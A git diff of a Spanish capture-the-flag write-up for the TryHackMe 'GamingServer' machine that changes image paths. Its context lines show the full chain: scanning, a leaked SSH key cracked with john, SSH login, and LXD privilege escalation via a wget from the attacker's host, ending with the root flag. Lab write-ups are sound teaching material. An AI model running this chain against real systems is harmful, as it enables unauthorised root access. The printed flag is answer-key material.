@@ -42,7 +42,7 @@ Escaneo completo de puertos:
 ```bash
 nmap -sC -sV -p- -Pn 10.130.139.192
 ```
-![nmap](imagenes/nmap.png)
+![nmap](Maquina_de_Linux/GamingServer/imagenes/nmap.png)
 
 Explicación del comando
 -sC → ejecuta scripts básicos de enumeración (NSE)
@@ -76,7 +76,7 @@ Se accede al servidor web:
 ```bash
 http://10.130.139.192
 ```
-![url](imagenes/url.png)
+![url](Maquina_de_Linux/GamingServer/imagenes/url.png)
 
 ### 4.1 Inspección inicial
 
@@ -94,7 +94,7 @@ Análisis del código fuente
  <!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
 ```
 
-![codigo](/Maquina_de_Linux/GamingServer/imagenes/codigo.png)
+![codigo](Maquina_de_Linux/GamingServer/imagenes/codigo.png)
 
  Esto nos indica johnque podría ser un nombre de usuario válido, útil para iniciar sesión o acceder mediante SSH más adelante.
 
@@ -107,7 +107,7 @@ Se realiza gobuster para descubrir rutas ocultas:
 gobuster dir -u http://10.130.139.192/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-![gobuster](/Maquina_de_Linux/GamingServer/imagenes/gobuster.png)
+![gobuster](Maquina_de_Linux/GamingServer/imagenes/gobuster.png)
 
 El escaneo con Gobuster revela dos directorios interesantes:
 
@@ -123,7 +123,7 @@ Se accede a la ruta:
 ```bash
 http://10.130.139.192/uploads/
 ```
-![uploads](/Maquina_de_Linux/GamingServer/imagenes/uploads.png)
+![uploads](Maquina_de_Linux/GamingServer/imagenes/uploads.png)
 
 Archivos encontrados:
 
@@ -136,7 +136,7 @@ Ahora accedemos a la otra ruta:
 ```bash
 http://10.130.139.192/secret/
 ```
-![uploads](/Maquina_de_Linux/GamingServer/imagenes/secret.png)
+![uploads](Maquina_de_Linux/GamingServer/imagenes/secret.png)
 
 La visita http://10.130.139.192/secret/ también reveló un directorio abierto con:
 
@@ -152,7 +152,7 @@ Entro al archivo secretKey desde el directorio vulnerable:
 ```bash
 http://10.130.139.192/uploads/secretKey
 ```
-![clave](/Maquina_de_Linux/GamingServer/imagenes/clave.png)
+![clave](Maquina_de_Linux/GamingServer/imagenes/clave.png)
 
 Copié todo el texto del archivo.
 
@@ -164,7 +164,7 @@ Guárdala en un archivo:
 ```bash
 nano id_key
 ```
-![nano](/Maquina_de_Linux/GamingServer/imagenes/nano.png)
+![nano](Maquina_de_Linux/GamingServer/imagenes/nano.png)
 
 (pega todo lo que has copiado)
 
@@ -182,7 +182,7 @@ Vamos a mirar una lista de contraseña para ver con cual cuadra
 ```bash
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
-![hash](/Maquina_de_Linux/GamingServer/imagenes/hash.png)
+![hash](Maquina_de_Linux/GamingServer/imagenes/hash.png)
 
 
 ## 11. Ver la contraseña
@@ -221,7 +221,7 @@ Ahora intentamos login:
 ssh -i id_key john@10.130.139.192
 ```
 
-![ssh](/Maquina_de_Linux/GamingServer/imagenes/ssh.png)
+![ssh](Maquina_de_Linux/GamingServer/imagenes/ssh.png)
 
 Cuando lo pida:
 
@@ -241,7 +241,7 @@ Utilicé el siguiente comando:
 ls  
 cat user.txt
 ```
-![ls](/Maquina_de_Linux/GamingServer/imagenes/ls.png)
+![ls](Maquina_de_Linux/GamingServer/imagenes/ls.png)
 
 Bandera de usuario:
 
@@ -277,7 +277,7 @@ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-al
 cd lxd-alpine-builder 
 ls
 ```
-![wget](/Maquina_de_Linux/GamingServer/imagenes/wget.png)
+![wget](Maquina_de_Linux/GamingServer/imagenes/wget.png)
 
 ### 12.2 Preparación del entorno LXD
 
@@ -287,7 +287,7 @@ Una vez descargado el script, lo configuré para generar la imagen Alpine necesa
 chmod +x build-alpine
 sudo ./build-alpine
 ```
-![hash](/Maquina_de_Linux/GamingServer/imagenes/hash2.png)
+![hash](Maquina_de_Linux/GamingServer/imagenes/hash2.png)
 
 Durante la ejecución, el script descargó los componentes necesarios de Alpine Linux y generó una imagen comprimida lista para ser importada en LXD.
 
@@ -310,7 +310,7 @@ Para transferir la imagen a la máquina víctima, se levantó un servidor web en
 ```bash
 python3 -m http.server 8000
 ```
-![python](imagenes/python.png)
+![python](Maquina_de_Linux/GamingServer/imagenes/python.png)
 
 Esto permite que la máquina objetivo pueda descargar el archivo mediante HTTP.
 
@@ -322,7 +322,7 @@ Desde la sesión SSH del usuario john, se descargó la imagen:
 ```bash
 wget http://192.168.142.53:8000/alpine-v3.23-x86_64-20260414_1800.tar.gz
 ```
-![wget](imagenes/wget2.png)
+![wget](Maquina_de_Linux/GamingServer/imagenes/wget2.png)
 
 ### 12.6 Importación de la imagen en LXD
 
@@ -331,7 +331,7 @@ Una vez descargada la imagen en la máquina víctima, el siguiente paso es impor
 ```bash
 lxc image import alpine-v3.23-x86_64-20260414_1800.tar.gz --alias myimage
 ```
-![lxc](imagenes/lxc.png)
+![lxc](Maquina_de_Linux/GamingServer/imagenes/lxc.png)
 
 Esto registra la imagen Alpine dentro del sistema LXD con el nombre myimage.
 
@@ -375,7 +375,7 @@ lxc start ignite
 ```bash
 lxc exec ignite /bin/sh
 ```
-![config](imagenes/config.png)
+![config](Maquina_de_Linux/GamingServer/imagenes/config.png)
 
 Ahora obtenemos una shell dentro del contenedor con privilegios elevados.
 
@@ -391,7 +391,7 @@ ls
 cd root
 ```
 
-![root](imagenes/root.png)
+![root](Maquina_de_Linux/GamingServer/imagenes/root.png)
 
 
 ### 12.12 Captura de la flag de root
@@ -401,7 +401,7 @@ Finalmente, leemos la bandera de root:
 ```bash
 cat root.txt
 ```
-![root](imagenes/catroot.png)
+![root](Maquina_de_Linux/GamingServer/imagenes/catroot.png)
 
 Resultado:
 THM{2e337b8c9f3aff0c2b3e8d4e6a7c88fc}
